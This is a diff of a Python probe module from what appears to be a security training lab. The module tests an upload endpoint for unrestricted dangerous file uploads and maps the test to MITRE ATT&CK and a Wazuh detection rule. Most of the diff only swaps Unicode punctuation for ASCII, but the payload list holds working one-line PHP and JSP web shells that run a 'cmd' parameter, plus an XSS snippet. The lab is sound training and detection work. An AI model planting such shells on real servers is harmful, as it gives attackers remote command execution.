@@ -1,5 +1,5 @@
 """
-modules/file_upload.py — APP-04: Unrestricted Dangerous File Upload probe.
+modules/file_upload.py - APP-04: Unrestricted Dangerous File Upload probe.
 
 Target: POST /files/upload (multipart/form-data)
 Vulnerability: No extension check, no MIME validation, no rename.
@@ -17,10 +17,10 @@ from core.models import (
 )
 
 _PAYLOADS = [
-    ("lab_test.php",      b"<?php echo shell_exec($_GET['cmd']); ?>",   "PHP dangerous upload test"),
-    ("test_payload.jsp",  b"<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "JSP dangerous upload test"),
-    ("test.html",         b"<html><script>alert('uploaded')</script></html>", "Stored XSS via HTML"),
-    ("config.php",        b"<?php phpinfo(); ?>",                        "phpinfo disclosure"),
+    ("lab_test.php", b"<?php echo shell_exec($_GET['cmd']); ?>", "PHP dangerous upload test"),
+    ("test_payload.jsp", b"<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "JSP dangerous upload test"),
+    ("test.html", b"<html><script>alert('uploaded')</script></html>", "Stored XSS via HTML"),
+    ("config.php", b"<?php phpinfo(); ?>", "phpinfo disclosure"),
 ]
 
 
@@ -35,7 +35,7 @@ class FileUploadModule(BaseModule):
     category = Category.FILE
     scenario_id = "APP-04"
     severity = Severity.HIGH
-    # MITRE ATT&CK — drop a web-shell-style file via the public upload form.
+    # MITRE ATT&CK - drop a web-shell-style file via the public upload form.
     mitre = {
         "tactics": ["TA0001 Initial Access", "TA0003 Persistence"],
         "techniques": [
@@ -54,7 +54,7 @@ class FileUploadModule(BaseModule):
             "Note: uploaded files are stored but NOT executed by this lab's server."
         ),
         "learner_steps": [
-            {"action": "Recon the upload form — confirm the file field name.",
+            {"action": "Recon the upload form - confirm the file field name.",
              "technique": "T1595.002 Active Scanning: Vulnerability Scanning",
              "command": "curl -s http://target-agent/files/upload | grep -o 'name=\"[^\"]*\"'",
              "expected": "The form accepts a multipart field named 'file'."},
@@ -78,7 +78,7 @@ class FileUploadModule(BaseModule):
         "detection_rule": "Wazuh dangerous-upload signature (.php/.jsp/.exe extension)",
         "success_markers": [
             "'Saved to:' in the upload response",
-            "✓ ACCEPTED lines with served URLs",
+            "PASS ACCEPTED lines with served URLs",
             "Wazuh alert flagging the dangerous filename",
         ],
         "quick_probe": "/files/upload",
@@ -95,7 +95,7 @@ class FileUploadModule(BaseModule):
         {'title': 'Verify file is served as-is', 'tactic': 'Persistence',
          'technique': 'T1505.003 Server Software Component: Web Shell',
          'command': "curl -sI http://target-agent/static/uploads/shell.php",
-         'hint': 'Check Content-Type, size, and that the file is actually served', 'expected': 'Dangerous extension accepted — unrestricted upload confirmed'},
+         'hint': 'Check Content-Type, size, and that the file is actually served', 'expected': 'Dangerous extension accepted - unrestricted upload confirmed'},
     ]
 
     def options(self) -> list[ModuleOption]:
@@ -114,7 +114,7 @@ class FileUploadModule(BaseModule):
         endpoint = opts.get("endpoint", "/files/upload")
         accepted = 0
 
-        # ── Recon (T1595.002): fetch the upload form first ──
+        # -- Recon (T1595.002): fetch the upload form first --
         self._log(log_fn, "Recon: fetching the upload form to confirm the field name...")
         base = self._get(target.base_url + endpoint, label="recon-baseline", timeout=target.timeout)
         steps.append(base)
@@ -136,11 +136,11 @@ class FileUploadModule(BaseModule):
             if saved:
                 accepted += 1
                 serve_url = f"{target.base_url}/static/uploads/{filename}"
-                r.evidence = f"UPLOAD ACCEPTED → {serve_url}"
-                self._log(log_fn, f"  ✓ ACCEPTED  {filename}  |  {desc}")
-                self._log(log_fn, f"    served at: {serve_url}")
+                r.evidence = f"UPLOAD ACCEPTED -> {serve_url}"
+                self._log(log_fn, f" PASS ACCEPTED {filename} | {desc}")
+                self._log(log_fn, f" served at: {serve_url}")
             else:
-                self._log(log_fn, f"  – rejected/error  {filename}  |  {desc}")
+                self._log(log_fn, f" - rejected/error {filename} | {desc}")
 
             steps.append(r)
 
